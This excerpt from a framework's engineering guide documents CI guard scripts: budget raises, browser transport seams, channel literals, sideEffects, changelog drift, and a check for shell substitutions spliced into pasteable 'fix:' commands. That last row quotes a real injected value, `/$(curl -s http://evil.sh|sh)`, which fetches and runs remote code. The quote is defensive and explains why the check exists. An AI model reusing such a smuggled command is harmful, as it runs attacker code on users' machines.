...
**Channel gap repair is built, and not yet measured**, `As of 2026-09-22` (21.0.0, unreleased).
...
9. **Useful, then efficient.** Working function first; bytes and milliseconds second. The agent
   never has to guess which one wins. A route or island budget is a measurement, not a ceiling to
   game. When real function costs bytes, raise the budget by the measured amount, with the number
   and the reason in the same diff. Never cut or stub a feature, or leave it
   `X_NOT_IMPLEMENTED`, to hold a figure. Bytes that buy no function are still a defect. Axiom 6 is
   not traded: the static path still pays nothing for the app path. "Number and reason in the same
   diff" is enforced by `bun run budget-raises` (`X_BUDGET_RAISE_UNSTATED`), against `origin/main`'s
   tip.
...
| route vocabulary copies | `bun run render-modes` — a step of the gate's `unit` check, standalone. Refuses a second declaration of `RENDER_MODES` / `OFFLINE_STRATEGIES` / `HYDRATE_STRATEGIES` anywhere in `packages/*/src`, matched on the **literal set** rather than the name: the copy that did the damage was called `PwaRenderMode`. Two shared members is a copy, one is a coincidence — the highest innocent overlap in the tree is 1. **Also a second `AsyncState` status union**, `As of 2026-09-22`. Its members are read off `packages/core/src/async-state.ts`, because a discriminated union exports no array to import, so nothing is typed out twice. A union sharing **three** statuses with it is a copy. Two is a coincidence the tree already has: `MutationStatus` and `BACKFILL_STATES` each share `pending` and `failed`. A core module that stops declaring `AsyncState` is a vacuity finding, never silence |
| one browser transport | `bun run browser-transport`, a scripts test on the gate's `unit` step. Refuses a `fetch(` **call**, `new WebSocket(`, `new XMLHttpRequest(` or `new EventSource(` in browser-reachable code outside its one seam: `packages/core/src/client-dispatch.ts` for `fetch`, `packages/realtime/src/browser-socket.ts` for sockets, `packages/storage/src/upload-client.ts` for XHR (upload progress), and nothing for `EventSource`. `packages/pwa/src/service-worker.ts` and `strategies.ts` are exempt, because the worker realm has no page store to bypass. Browser-reachable is **derived**, never listed: every `*.island.tsx`, plus every module that calls `clientTransport` / `pageClient`, closed over their imports name by name through barrels (`scripts/lib/import-closure.ts`). So a server-only `fetch` in `auth/oauth-*` or `jobs/webhook.ts` is out of scope because nothing reaches it, not because a pin says so. An injected `fetchImpl = globalThis.fetch` **default** is the seam and is never reported: `flight-copies`' call-versus-default split. `X_BROWSER_TRANSPORT_UNSCANNED` fires when the `fetch` seam stops calling `fetch`, which would make every check vacuous. It also refuses a **server barrel** in that closure: a package that publishes a `./record`, `./browser` or `./client` entry has its barrel refused in browser code (`X_BROWSER_SERVER_BARREL`), derived from `exports` (`scripts/lib/server-barrels.ts`), never listed. Pinned at **zero**. Run it for the current findings; plan 101 slice 16 migrates the app one it reports |
| one channel spelling | `bun run channel-literals`, a scripts test on the gate's `unit` step. Refuses a string or template literal as the first argument of `useChannel`, `publishRecords`, `subscribe`, `unsubscribe` or `publish`, and a topic built with `+` or `${…}`, anywhere outside `packages/realtime/src/channel.ts`, the one module whose `channel(name, { params, policy })` turns a declaration into a topic. Otherwise the publisher and the subscriber drift onto two spellings, and frames arrive nowhere with no error on either side. A declaration, a call or a plain identifier as the first argument is never reported: that is what passing a channel looks like. Tests are fixtures. `X_CHANNEL_LITERAL_UNSCANNED` fires when the seam was not scanned. Pinned at **zero**; run it for the current findings |
| a new error code | `bun run new-error-code <CODE> --package <pkg> --title '…' --fix '…' [--meaning '…'] [--section '…']`. It writes the registration in `packages/<pkg>/src/errors.ts` (the `…TITLES` table and the package's own codes list, or a literal `registerErrorCodes({ … })`) **and** the `wiki/Error-Codes.md` row in that section's Code table. Both are planned before either is written, so neither lands alone. An `errors.ts` in no recognised shape is refused by name (`X_NEW_ERROR_CODE_PATTERN_UNKNOWN`), never edited by guess. It exists because codes kept landing a wave before their row, turning the `errors` step red |
| a budget raised without its number | `bun run budget-raises`, a step of the gate's `unit` check, standalone. A route's `budget.js` / `budget.lcp` above the same file's value at `origin/main`'s **tip** needs a comment directly above the `budget:` line carrying `measured: <N> B` (`ms` for `lcp`) and `why:`, else `X_BUDGET_RAISE_UNSTATED`. The tip, not the merge-base, so CI fetches one commit (`git fetch --no-tags --depth=1`, in `ci.yml`'s `verify` job on every ref but `main`). A checkout without `origin/main` compares nothing, and its summary prints the fetch. No raise buys an axiom-6 exception: `site/` importing `app/` stays a `boundaries` error. Pinned at **zero** |
| a guard that cannot load | every guard that reads the whole tree imports **leaf modules** rather than a package barrel, and the ones `package.json` runs as `bun --preload ./scripts/lib/guard-preload.ts scripts/<guard>.ts` report a load failure as `X_GUARD_LOAD_FAILED`, naming the module. A load failure is Bun's `Export named '…' not found` or `Cannot find module '…'`. Before this, one half-written package in a guard's import graph crashed it with a bare `SyntaxError`, which a parallel agent read as a mystery or as its own fault. A guard's own failure is still thrown as it was (`scripts/lib/guard-load.ts`). Which guards are preloaded is `grep -- '--preload' package.json`, never a list here |
...
| dishonest `sideEffects` | `bun run side-effects` — a step of the gate's `unit` check, standalone. Refuses a package whose `sideEffects` excludes a module that provably runs at import time, and an entry matching no file — a stale entry protects nothing while reading as a rule still in force. **Never `false` where a `registerErrorCodes()` runs**: measured, `false` on `@ultimat3/core` drops `schema-error-codes.ts`, which registers `@ultimat3/schema`'s titles because schema (tier 0) cannot register its own. Declaring one is still worth 22,214 → 5,948 B against declaring nothing. **The "~376 B an island" figure is deleted rather than corrected**: it was measured against a bundler that was ignoring the array, so it described nothing. Bun reads any `sideEffects` **array** as `false` and shakes the named module out anyway (`oven-sh/bun#40650`, four files, no `@ultimat3/*`, deterministic on 1.4.0, 1.4.1-canary and 1.3.14; esbuild keeps it on the same input). So the array is kept for rollup, webpack and esbuild — real consumers of these packages — and **`SIDE_EFFECTS_ANCHORS` is what enforces anything here**: three modules that register on behalf of a module which never imports them (`core/schema-error-codes.ts`, `i18n/framework.ts`, `query/registry.ts`), each bare-imported by its barrel or `X_SIDE_EFFECTS_UNANCHORED`. A **list**, for `FLOOR_ABOVE`'s reason: "anchor everything" put `core/context.ts` in every browser chunk (+3,485 B for a provider a browser cannot fire) and blew `like.island.tsx`'s 50 kB route budget, and "anchor every `register*`" dragged core's error registry (~5.6 kB) into every `@ultimat3/ui` chunk — a package's own `errors.ts` is anchored by use, because the constructors live in it. The three cost **0 B** on all four islands and make retention deterministic: the `schema-error-codes.ts` flap went 12→0 of 60 pairs on 1.4.0 and 28→0 on 1.3.14. A ratchet — 24 of 30 packages silent on day one; `--explain --json` prints the array the tree measures |
| changelog and migration drift | `bun run changelog-check` — a step of the gate's `unit` check, standalone. Two `##` headings sharing a version, an empty released section, `BREAKING —` still under `[Unreleased]` at a tagged commit, and each major's `wiki/Upgrading.md` count against **that section's own** entries — a count derived from the whole file cannot see a misplaced entry, because it only makes the number smaller. The **in-flight** major's row (its third cell names `[Unreleased]`) is held to `[Unreleased]`'s own `BREAKING —` count, `As of 2026-09-22`. Until then it was skipped, so its "**N** so far" was checked by nobody until the release |
...
| a value spliced into a `fix:` command | `bun run fix-shell-arg` — a step of the gate's `errors` check, standalone, and the THIRD half of the render rule beside `error-render` and `catch-render`. Those two ask whether rendering a value can throw; this one asks whether the rendered line can RUN. A `fix:` is a command meant to be pasted, and `x g route /$(curl -s http://evil.sh\|sh)` was a real rendered fix, for an unauthenticated `GET` against any unrouted path — `renderFixShellArg` was written to close that ONE site and nothing watched the other 150. Matched on POSITION, never on a name: a substitution after a command word that opens the segment, or one sitting directly after `\|`, `&&`, `;` or `$(`. A `#` earlier on the line is a shell comment, and an em dash, a comma or a `(` between the word and the substitution is prose — three false positives measured and excluded, because noise is how a rule gets switched off. A ratchet, 154 sites across 17 packages on day one |
